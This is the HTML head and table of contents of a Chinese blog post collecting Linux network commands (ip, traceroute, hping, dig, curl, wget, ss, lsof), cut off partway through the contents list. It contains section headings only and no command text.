<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>长期总结 - Linux网络命令合集 | Cylon&#39;s Collection</title>
<meta name="keywords" content="kubernetes, kubernetes network, command, linux网络命令">
<meta name="description" content="长期总结 - Linux网络命令合集 - Cylon&#39;s Collection">
<meta name="author" content="cylon">
<link rel="canonical" href="https://www.oomkill.com/2021/01/linux-network-command/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.41a8706089174fae1769fc26da4d1d354fa88083db604a95688ff58852dd9006.css" integrity="sha256-QahwYIkXT64Xafwm2k0dNU&#43;ogIPbYEqVaI/1iFLdkAY=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://www.oomkill.com/favicon.ico">
<link rel="apple-touch-icon" href="https://www.oomkill.com/apple-touch-icon.png">

<meta name="twitter:title" content="长期总结 - Linux网络命令合集 | Cylon&#39;s Collection" />
<meta name="twitter:description" content="" />
<meta property="og:title" content="长期总结 - Linux网络命令合集 | Cylon&#39;s Collection" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.oomkill.com/2021/01/linux-network-command/" />
<meta property="article:section" content="posts" />
  <meta property="article:published_time" content="2021-01-18T00:00:00&#43;00:00" />
  <meta property="article:modified_time" content="2023-03-22T23:00:36&#43;08:00" />


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://www.oomkill.com/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "长期总结 - Linux网络命令合集",
      "item": "https://www.oomkill.com/2021/01/linux-network-command/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "长期总结 - Linux网络命令合集 | Cylon's Collection",
  "name": "长期总结 - Linux网络命令合集",
  "description": "",
  "keywords": [
    "kubernetes", "kubernetes network", "command", "linux网络命令"
  ],
  "wordCount" : "21872",
  "inLanguage": "zh",
  "datePublished": "2021-01-18T00:00:00Z",
  "dateModified": "2023-03-22T23:00:36+08:00",
  "author":{
    "@type": "Person",
    "name": "cylon"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://www.oomkill.com/2021/01/linux-network-command/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Cylon's Collection",
    "logo": {
      "@type": "ImageObject",
      "url": "https://www.oomkill.com/favicon.ico"
    }
  }
}
</script><script type="text/javascript"
        async
        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [['$','$'], ['\\(','\\)']],
    displayMath: [['$$','$$'], ['\[\[','\]\]']],
    processEscapes: true,
    processEnvironments: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
    TeX: { equationNumbers: { autoNumber: "AMS" },
         extensions: ["AMSmath.js", "AMSsymbols.js"] }
  }
});

MathJax.Hub.Queue(function() {
    
    
    
    var all = MathJax.Hub.getAllJax(), i;
    for(i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>

<style>
code.has-jax {
    font: inherit;
    font-size: 100%;
    background: inherit;
    border: inherit;
    color: #515151;
}
</style>
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary-bg: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list-page {
                background: var(--theme);
            }

            .list-page:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list-page:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

</head>

<body class=" type-posts kind-page layout-" id="top"><script data-no-instant>
function switchTheme(theme) {
  switch (theme) {
    case 'light':
      document.body.classList.remove('dark');
      break;
    case 'dark':
      document.body.classList.add('dark');
      break;
    
    default:
      if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
      }
  }
}

function isDarkTheme() {
  return document.body.className.includes("dark");
}

function getPrefTheme() {
  return localStorage.getItem("pref-theme");
}

function setPrefTheme(theme) {
  switchTheme(theme)
  localStorage.setItem("pref-theme", theme);
}

const toggleThemeCallbacks = {}
toggleThemeCallbacks['main'] = (isDark) => {
  
  if (isDark) {
    setPrefTheme('light');
  } else {
    setPrefTheme('dark');
  }
}




window.addEventListener('toggle-theme', function() {
  
  const isDark = isDarkTheme()
  for (const key in toggleThemeCallbacks) {
    toggleThemeCallbacks[key](isDark)
  }
});


function toggleThemeListener() {
  
  window.dispatchEvent(new CustomEvent('toggle-theme'));
}

</script>
<script>
  
  (function() {
    const defaultTheme = 'auto';
    const prefTheme = getPrefTheme();
    const theme = prefTheme ? prefTheme : defaultTheme;

    switchTheme(theme);
  })();
</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://www.oomkill.com" accesskey="h" title="Cylon&#39;s Collection (Alt + H)">Cylon&#39;s Collection</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://www.oomkill.com/archives/" title="归档"
                >归档
                </a>
            </li>
            <li>
                <a href="https://www.oomkill.com/tags/" title="标签"
                >标签
                </a>
            </li>
            <li>
                <a href="https://www.oomkill.com/search/" title="搜索 (Alt &#43; /)"data-no-instant accesskey=/
                >搜索
                </a>
            </li>
            <li>
                <a href="https://www.oomkill.com/about/" title="关于"
                >关于
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main post">

<article class="post-single">
  <header class="post-header"><h1 class="post-title">长期总结 - Linux网络命令合集</h1>
    <div class="post-meta"><span class="meta-item">
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select: text;"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select: text;"></rect><line x1="16" y1="2" x2="16" y2="6" style="user-select: text;"></line><line x1="8" y1="2" x2="8" y2="6" style="user-select: text;"></line><line x1="3" y1="10" x2="21" y2="10" style="user-select: text;"></line></svg>
  <span>2021-01-18</span></span><span class="meta-item">
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar" style="user-select: text;"><rect x="3" y="4" width="18" height="18" rx="2" ry="2" style="user-select: text;"></rect><line x1="16" y1="2" x2="16" y2="6" style="user-select: text;"></line><line x1="8" y1="2" x2="8" y2="6" style="user-select: text;"></line><line x1="3" y1="10" x2="21" y2="10" style="user-select: text;"></line></svg>
  <span>Edited on 2023-03-22</span></span><span class="meta-item">
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon" style="user-select: text;"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z" style="user-select: text;"></path><line x1="7" y1="7" x2="7" y2="7" style="user-select: text;"></line></svg>
  <span class="post-tags"><a href="https://www.oomkill.com/tags/network/">network</a><a href="https://www.oomkill.com/tags/command/">command</a></span></span><span class="meta-item">
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><circle cx="12" cy="12" r="9"></circle><polyline points="12 7 12 12 15 15"></polyline></svg>
  <span>44 分钟</span></span>

      
      
    </div>
  </header> <div class="toc side right">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#ip" aria-label="IP">IP</a><ul>
                        
                <li>
                    <a href="#ip-link" aria-label="ip link">ip link</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3%e4%bf%a1%e6%81%afip-link-show" aria-label="获取网络接口信息ip link show">获取网络接口信息ip link show</a></li>
                <li>
                    <a href="#%e4%bf%ae%e6%94%b9%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3%e4%bf%a1%e6%81%af-ip-link-set" aria-label="修改网络接口信息 ip link set">修改网络接口信息 ip link set</a></li>
                <li>
                    <a href="#%e7%ae%a1%e7%90%86%e8%b7%af%e7%94%b1%e8%a1%a8-ip-route" aria-label="管理路由表 ip route">管理路由表 ip route</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e8%b7%af%e7%94%b1%e8%a1%a8-ip-route-list" aria-label="显示路由表 ip route list">显示路由表 ip route list</a></li>
                <li>
                    <a href="#%e4%bf%ae%e6%94%b9%e8%b7%af%e7%94%b1%e8%a1%a8-ip-route-adddel" aria-label="修改路由表 ip route add/del">修改路由表 ip route add/del</a></li>
                <li>
                    <a href="#arp%e5%9c%b0%e5%9d%80%e8%a1%a8%e7%ae%a1%e7%90%86--ip-neighbor" aria-label="ARP地址表管理  ip neighbor">ARP地址表管理  ip neighbor</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%baarp-%e6%9d%a1%e7%9b%ae-ip-neigh-show" aria-label="显示arp 条目 ip neigh show">显示arp 条目 ip neigh show</a></li>
                <li>
                    <a href="#%e4%bf%ae%e6%94%b9arp%e6%9d%a1%e7%9b%ae-ip-neigh-adddel" aria-label="修改arp条目 ip neigh add/del">修改arp条目 ip neigh add/del</a></li></ul>
                </li>
                <li>
                    <a href="#traceroute" aria-label="traceroute">traceroute</a><ul>
                        
                <li>
                    <a href="#%e8%bf%bd%e8%b8%aa%e7%bd%91%e7%bb%9c%e4%b8%bb%e6%9c%ba%e7%9a%84%e8%b7%af%e7%94%b1-traceroute-host" aria-label="追踪网络主机的路由 traceroute host">追踪网络主机的路由 traceroute host</a></li>
                <li>
                    <a href="#%e8%bf%bd%e8%b8%aaipv6%e5%8d%8f%e8%ae%ae" aria-label="追踪IPv6协议">追踪IPv6协议</a></li>
                <li>
                    <a href="#%e5%bf%bd%e7%95%a5%e4%b8%bb%e6%9c%ba%e5%90%8d%e4%b8%8eip%e7%9a%84%e6%98%a0%e5%b0%84" aria-label="忽略主机名与IP的映射">忽略主机名与IP的映射</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%ae%e7%9b%b8%e5%ba%94%e7%ad%89%e5%be%85%e6%97%b6%e9%97%b4" aria-label="设置相应等待时间">设置相应等待时间</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e7%89%b9%e5%ae%9a%e7%9a%84%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3" aria-label="使用特定的网络接口">使用特定的网络接口</a></li></ul>
                </li>
                <li>
                    <a href="#ping" aria-label="ping">ping</a></li>
                <li>
                    <a href="#hping" aria-label="hping">hping</a><ul>
                        
                <li>
                    <a href="#%e5%8f%82%e6%95%b0%e8%af%b4%e6%98%8e" aria-label="参数说明">参数说明</a></li>
                <li>
                    <a href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" aria-label="端口扫描">端口扫描</a></li>
                <li>
                    <a href="#%e9%80%9a%e8%bf%87hping3%e8%b7%9f%e8%b8%aa%e8%b7%af%e7%94%b1%e5%88%b0%e6%8c%87%e5%ae%9a%e7%ab%af%e5%8f%a3" aria-label="通过Hping3跟踪路由到指定端口：">通过Hping3跟踪路由到指定端口：</a></li>
                <li>
                    <a href="#%e4%b8%8d%e5%90%8c%e7%b1%bb%e5%9e%8b%e7%9a%84icmp" aria-label="不同类型的ICMP">不同类型的ICMP</a></li>
                <li>
                    <a href="#%e9%80%9a%e8%bf%87hping3-%e8%bf%9b%e8%a1%8cack%e6%89%ab%e6%8f%8f" aria-label="通过hping3 进行ACK扫描">通过hping3 进行ACK扫描</a></li>
                <li>
                    <a href="#udp%e6%89%ab%e6%8f%8f" aria-label="UDP扫描">UDP扫描</a></li>
                <li>
                    <a href="#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e8%af%86%e5%88%ab" aria-label="操作系统识别">操作系统识别</a></li>
                <li>
                    <a href="#%e5%86%85%e5%ae%b9%e6%8e%a2%e6%b5%8b" aria-label="内容探测">内容探测</a></li>
                <li>
                    <a href="#%e7%bd%91%e7%bb%9c%e5%90%8e%e9%97%a8" aria-label="网络后门">网络后门</a></li></ul>
                </li>
                <li>
                    <a href="#nslookup" aria-label="nslookup">nslookup</a><ul>
                        
                <li>
                    <a href="#%e7%ae%80%e5%8d%95%e6%9f%a5%e8%af%a2" aria-label="简单查询">简单查询</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2mx%e8%ae%b0%e5%bd%95" aria-label="查询MX记录">查询MX记录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2ns%e8%ae%b0%e5%bd%95" aria-label="查询NS记录">查询NS记录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2soa%e8%ae%b0%e5%bd%95" aria-label="查询SOA记录">查询SOA记录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e5%8f%af%e7%94%a8%e7%9a%84dns%e8%ae%b0%e5%bd%95" aria-label="查看可用的DNS记录">查看可用的DNS记录</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e6%8c%87%e5%ae%9adns%e6%9f%a5%e8%af%a2" aria-label="使用指定DNS查询">使用指定DNS查询</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e7%89%b9%e6%ae%8a%e7%9a%84dns%e7%ab%af%e5%8f%a3" aria-label="使用特殊的dns端口">使用特殊的dns端口</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%ae%e8%b6%85%e6%97%b6%e6%97%b6%e9%97%b4" aria-label="设置超时时间">设置超时时间</a></li>
                <li>
                    <a href="#%e5%90%af%e7%94%a8%e8%b0%83%e8%af%95%e6%a8%a1%e5%bc%8f" aria-label="启用调试模式">启用调试模式</a></li>
                <li>
                    <a href="#dig" aria-label="dig">dig</a></li>
                <li>
                    <a href="#%e8%af%ad%e6%b3%95" aria-label="语法">语法</a></li>
                <li>
                    <a href="#%e8%a7%a3%e6%9e%90ip%e5%9c%b0%e5%9d%80" aria-label="解析IP地址">解析IP地址</a></li>
                <li>
                    <a href="#%e4%bb%85%e6%98%be%e7%a4%ba%e5%ba%94%e7%ad%94%e9%83%a8%e5%88%86" aria-label="仅显示应答部分">仅显示应答部分</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2mx%e8%ae%b0%e5%bd%95-1" aria-label="查询MX记录">查询MX记录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2ns%e8%ae%b0%e5%bd%95-1" aria-label="查询NS记录">查询NS记录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e8%af%a2%e6%89%80%e6%9c%89%e8%ae%b0%e5%bd%95" aria-label="查询所有记录">查询所有记录</a></li>
                <li>
                    <a href="#%e4%bb%85%e6%9f%a5%e7%9c%8b%e8%ae%b0%e5%bd%95%e7%9a%84ip" aria-label="仅查看记录的IP">仅查看记录的IP</a></li>
                <li>
                    <a href="#%e5%8f%8d%e5%90%91%e6%9f%a5%e6%89%be" aria-label="反向查找">反向查找</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e6%8c%87%e5%ae%9adns%e6%9d%a5%e8%bf%9b%e8%a1%8c%e6%9f%a5%e8%af%a2" aria-label="使用指定DNS来进行查询">使用指定DNS来进行查询</a></li>
                <li>
                    <a href="#%e6%89%b9%e9%87%8f%e6%9f%a5%e8%af%a2" aria-label="批量查询">批量查询</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%aedig%e9%bb%98%e8%ae%a4%e9%80%89%e9%a1%b9" aria-label="设置dig默认选项">设置dig默认选项</a></li></ul>
                </li>
                <li>
                    <a href="#curl" aria-label="curl">curl</a><ul>
                        
                <li>
                    <a href="#curl%e5%b8%b8%e7%94%a8%e5%8f%82%e6%95%b0" aria-label="cURL常用参数">cURL常用参数</a></li>
                <li>
                    <a href="#%e9%99%90%e5%88%b6%e4%b8%8b%e8%bd%bd%e9%80%9f%e7%8e%87" aria-label="限制下载速率">限制下载速率</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e4%bb%a3%e7%90%86%e8%ae%bf%e9%97%ae" aria-label="使用代理访问">使用代理访问</a></li>
                <li>
                    <a href="#%e9%99%90%e9%80%9f%e8%ae%bf%e9%97%ae" aria-label="限速访问">限速访问</a></li>
                <li>
                    <a href="#%e5%ad%98%e5%82%a8cookie%e5%92%8c%e4%bd%bf%e7%94%a8cookie" aria-label="存储cookie和使用cookie">存储cookie和使用cookie</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e4%bb%a3%e7%90%86" aria-label="使用代理">使用代理</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8applicationx-www-form-urlencoded%e8%a1%a8%e5%8d%95%e7%b1%bb%e5%9e%8b" aria-label="使用application/x-www-form-urlencoded表单类型">使用application/x-www-form-urlencoded表单类型</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8json%e6%a0%bc%e5%bc%8f%e4%bd%9c%e4%b8%babody" aria-label="使用json格式作为body">使用json格式作为body</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8curl-%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6" aria-label="使用curl 上传文件">使用curl 上传文件</a></li>
                <li>
                    <a href="#curl%e8%be%93%e5%87%ba%e7%9a%84%e6%a0%bc%e5%bc%8f%e5%8f%98%e9%87%8f" aria-label="curl输出的格式变量">curl输出的格式变量</a></li>
                <li>
                    <a href="#%e4%bb%85%e8%8e%b7%e5%8f%96http%e7%8a%b6%e6%80%81%e7%a0%81" aria-label="仅获取http状态码">仅获取http状态码</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96%e6%95%b4%e4%b8%aa%e8%af%b7%e6%b1%82%e7%9a%84%e6%97%b6%e9%97%b4" aria-label="获取整个请求的时间">获取整个请求的时间</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96%e5%9f%9f%e5%90%8d%e8%a7%a3%e6%9e%90%e6%97%b6%e9%97%b4" aria-label="获取域名解析时间">获取域名解析时间</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96tcp%e8%bf%9e%e6%8e%a5%e8%80%97%e6%97%b6" aria-label="获取TCP连接耗时">获取TCP连接耗时</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96sslssh%e6%8f%a1%e6%89%8b%e5%88%b0%e8%bf%9c%e7%a8%8b%e4%b8%bb%e6%9c%ba%e8%80%97%e6%97%b6" aria-label="获取SSL/SSH握手到远程主机耗时">获取SSL/SSH握手到远程主机耗时</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96%e6%89%80%e6%9c%89%e9%87%8d%e5%ae%9a%e5%90%91%e7%9a%84%e8%80%97%e6%97%b6" aria-label="获取所有重定向的耗时">获取所有重定向的耗时</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e4%b8%8b%e8%bd%bd%e7%9a%84%e6%80%bb%e5%ad%97%e8%8a%82%e6%95%b0" aria-label="获得下载的总字节数">获得下载的总字节数</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e8%af%b7%e6%b1%82%e4%bd%93%e9%80%81%e5%ad%97%e8%8a%82%e6%95%b0" aria-label="获得请求体送字节数">获得请求体送字节数</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e4%bc%a0%e8%be%93%e4%b8%ad%e7%9a%84%e8%bf%9e%e6%8e%a5%e6%95%b0" aria-label="获得传输中的连接数">获得传输中的连接数</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e9%87%8d%e5%ae%9a%e5%90%91%e6%ac%a1%e6%95%b0" aria-label="获得重定向次数">获得重定向次数</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97ssl%e9%aa%8c%e8%af%81%e7%bb%93%e6%9e%9c" aria-label="获得SSL验证结果">获得SSL验证结果</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e9%87%8d%e5%ae%9a%e5%90%91%e7%9a%84%e5%9c%b0%e5%9d%80" aria-label="获得重定向的地址">获得重定向的地址</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%be%97%e4%b8%8a%e4%bc%a0%e5%92%8c%e4%b8%8b%e8%bd%bd%e9%80%9f%e5%ba%a6" aria-label="获得上传和下载速度">获得上传和下载速度</a></li>
                <li>
                    <a href="#%e6%a0%b9%e6%8d%ae%e8%87%aa%e5%b7%b1%e9%9c%80%e8%a6%81%e6%8b%bc%e6%8e%a5%e7%89%b9%e5%ae%9a%e6%a0%bc%e5%bc%8f" aria-label="根据自己需要拼接特定格式">根据自己需要拼接特定格式</a></li></ul>
                </li>
                <li>
                    <a href="#wget" aria-label="wget">wget</a><ul>
                        
                <li>
                    <a href="#%e7%ae%80%e5%8d%95%e4%bd%bf%e7%94%a8" aria-label="简单使用">简单使用</a></li>
                <li>
                    <a href="#%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6%e5%b9%b6%e4%bf%9d%e5%ad%98%e4%b8%ba%e6%8c%87%e5%ae%9a%e5%90%8d%e7%a7%b0" aria-label="下载文件并保存为指定名称">下载文件并保存为指定名称</a></li>
                <li>
                    <a href="#%e5%b0%86%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd%e5%88%b0%e6%8c%87%e5%ae%9a%e7%9b%ae%e5%bd%95" aria-label="将文件下载到指定目录">将文件下载到指定目录</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%ae%e4%b8%8b%e8%bd%bd%e9%80%9f%e5%ba%a6" aria-label="设置下载速度">设置下载速度</a></li>
                <li>
                    <a href="#%e6%96%ad%e7%82%b9%e7%bb%ad%e4%bc%a0" aria-label="断点续传">断点续传</a></li>
                <li>
                    <a href="#%e4%b8%8b%e8%bd%bd%e5%a4%9a%e4%b8%aa%e6%96%87%e4%bb%b6" aria-label="下载多个文件">下载多个文件</a></li>
                <li>
                    <a href="#%e4%b8%8b%e8%bd%bd%e7%bd%91%e9%a1%b5%e7%bd%91%e7%ab%99%e9%95%9c%e5%83%8f" aria-label="下载网页（网站镜像）">下载网页（网站镜像）</a></li>
                <li>
                    <a href="#ftp%e4%b8%8b%e8%bd%bd" aria-label="FTP下载">FTP下载</a></li>
                <li>
                    <a href="#%e5%90%8e%e5%8f%b0%e4%b8%8b%e8%bd%bd" aria-label="后台下载">后台下载</a></li>
                <li>
                    <a href="#%e4%b8%ad%e6%96%ad%e9%87%8d%e8%af%95%e6%ac%a1%e6%95%b0" aria-label="中断重试次数">中断重试次数</a></li>
                <li>
                    <a href="#%e5%bf%bd%e7%95%a5%e8%af%81%e4%b9%a6%e9%aa%8c%e8%af%81" aria-label="忽略证书验证">忽略证书验证</a></li>
                <li>
                    <a href="#%e8%87%aa%e5%ae%9a%e4%b9%89user-agent" aria-label="自定义User-Agent">自定义User-Agent</a></li>
                <li>
                    <a href="#%e5%ae%9e%e7%94%a8%e6%8a%80%e5%b7%a7-%e4%b8%8b%e8%bd%bd%e5%86%85%e5%ae%b9%e5%88%b0%e6%a0%87%e5%87%86%e8%be%93%e5%87%bastdout" aria-label="实用技巧-下载内容到标准输出stdout">实用技巧-下载内容到标准输出stdout</a></li></ul>
                </li>
                <li>
                    <a href="#ss" aria-label="ss">ss</a><ul>
                        
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%89%80%e6%9c%89%e8%bf%9e%e6%8e%a5" aria-label="查看所有连接">查看所有连接</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8blistening-%e4%b8%8e-non-listening-ports" aria-label="查看Listening 与 Non-listening Ports">查看Listening 与 Non-listening Ports</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%9b%91%e5%90%ac-%e5%a5%97%e6%8e%a5%e5%ad%97%e5%88%97%e8%a1%a8" aria-label="查看监听 套接字列表">查看监听 套接字列表</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%89%80%e6%9c%89tcp%e8%bf%9e%e6%8e%a5" aria-label="查看所有TCP连接">查看所有TCP连接</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%89%80%e6%9c%89%e7%9b%91%e5%90%ac%e7%b1%bb%e5%9e%8b%e7%9a%84tcp%e8%bf%9e%e6%8e%a5" aria-label="查看所有监听类型的tcp连接">查看所有监听类型的tcp连接</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%89%80%e6%9c%89udp%e8%bf%9e%e6%8e%a5" aria-label="查看所有udp连接">查看所有udp连接</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%9b%91%e5%90%ac%e7%b1%bb%e5%9e%8b%e7%9a%84udp%e8%bf%9e%e6%8e%a5" aria-label="查看监听类型的UDP连接">查看监听类型的UDP连接</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%basocket%e7%9a%84pid%e8%bf%9b%e7%a8%8bid" aria-label="显示socket的pid进程id">显示socket的pid进程id</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e8%bf%9e%e6%8e%a5%e6%91%98%e8%a6%81%e4%bf%a1%e6%81%af" aria-label="显示连接摘要信息">显示连接摘要信息</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%baipv6%e6%88%96ipv4-%e8%bf%9e%e6%8e%a5" aria-label="显示ipv6或ipv4 连接">显示ipv6或ipv4 连接</a></li>
                <li>
                    <a href="#%e7%ad%9b%e9%80%89%e8%bf%9e%e6%8e%a5" aria-label="筛选连接">筛选连接</a></li>
                <li>
                    <a href="#%e4%b8%8d%e8%a7%a3%e6%9e%90%e4%b8%bb%e6%9c%ba%e5%90%8d" aria-label="不解析主机名">不解析主机名</a></li>
                <li>
                    <a href="#%e4%bb%85%e6%98%be%e7%a4%ba%e7%9b%91%e5%90%ac%e5%a5%97%e6%8e%a5%e5%ad%97" aria-label="仅显示监听套接字">仅显示监听套接字</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e6%97%b6%e9%97%b4%e4%bf%a1%e6%81%af" aria-label="显示时间信息">显示时间信息</a></li>
                <li>
                    <a href="#netstat" aria-label="netstat">netstat</a></li></ul>
                </li>
                <li>
                    <a href="#lsof" aria-label="lsof">lsof</a><ul>
                        
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e6%89%80%e6%9c%89%e6%89%93%e5%bc%80%e7%9a%84%e6%96%87%e4%bb%b6" aria-label="列出所有打开的文件">列出所有打开的文件</a></li>
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e7%94%a8%e6%88%b7%e8%bf%9b%e7%a8%8b%e4%bd%bf%e7%94%a8%e7%9a%84%e6%96%87%e4%bb%b6" aria-label="列出用户进程使用的文件">列出用户进程使用的文件</a></li>
                <li>
                    <a href="#%e6%a0%b9%e6%8d%ae%e7%bd%91%e7%bb%9c%e5%9c%b0%e5%9d%80%e6%9f%a5%e6%89%be%e6%96%87%e4%bb%b6" aria-label="根据网络地址查找文件">根据网络地址查找文件</a></li>
                <li>
                    <a href="#%e6%8c%89%e7%85%a7%e7%a8%8b%e5%ba%8f%e5%90%8d%e7%a7%b0%e5%88%97%e5%87%ba%e6%89%80%e6%89%93%e5%8d%a1%e7%9a%84%e6%96%87%e4%bb%b6" aria-label="按照程序名称列出所打卡的文件">按照程序名称列出所打卡的文件</a></li>
                <li>
